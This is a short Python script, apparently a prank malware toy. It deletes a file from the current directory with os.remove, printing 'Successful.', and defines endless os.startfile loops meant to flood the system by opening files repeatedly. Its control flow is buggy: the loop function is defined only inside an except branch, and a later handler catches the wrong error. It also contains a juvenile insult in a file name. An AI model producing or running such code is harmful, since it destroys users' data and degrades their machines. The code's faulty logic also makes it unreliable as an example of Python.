import os
try:
 files_path = [os.path.abspath(x) for x in os.listdir('.')]
 def convert(list1):
  str = ''
  for i in list1:
   str += i  
   return str  
 final=(convert(files_path))
 os.remove(final)
 print("Successful.")
except:
   def runpro():
    try:
     while True:
      os.startfile("python.py")
    except:
      while True:
       os.startfile("random.py")
    try:
      while True:
         os.startfile("math.py")
    except:
      while True:
         os.startfile("zipfile.py")
try:
   os.startfile("euoewreowuroeuropwuyourmom")
except KeyboardInterrupt:
   while True:
    runpro()
   
   
         
         
         
      
      
